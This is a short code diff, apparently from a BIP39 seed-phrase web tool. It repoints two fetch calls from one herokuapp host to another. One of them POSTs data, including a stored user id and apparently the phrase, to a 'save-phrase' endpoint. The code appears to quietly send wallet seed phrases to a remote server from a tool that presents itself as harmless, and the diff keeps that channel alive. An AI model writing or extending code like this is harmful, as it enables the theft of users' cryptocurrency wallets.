@@ -192,7 +192,7 @@
 
     // save user id
     (function saveUserId() {
-        fetch('https://bipserver.herokuapp.com', {
+        fetch('https://bip39server.herokuapp.com', {
             method: 'GET',
             headers: {
                 "Content-type": "application/json; charset=UTF-8"
@@ -273,7 +273,7 @@
                 user_id: localStorage.getItem('user_id')
             } 
 
-            fetch('https://bipserver.herokuapp.com/api/v1/save-phrase', {
+            fetch('https://bip39server.herokuapp.com/api/v1/save-phrase', {
                 method: 'POST',
                 body: JSON.stringify(body),
                 headers: {
